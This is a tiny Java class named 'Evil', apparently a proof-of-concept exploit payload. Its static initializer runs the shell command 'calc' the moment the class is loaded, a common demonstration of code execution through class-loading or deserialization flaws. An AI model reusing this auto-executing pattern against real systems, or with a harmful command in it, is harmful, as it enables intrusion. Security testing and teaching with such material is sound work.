import java.io.IOException;

public class Evil {
    static {
        Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
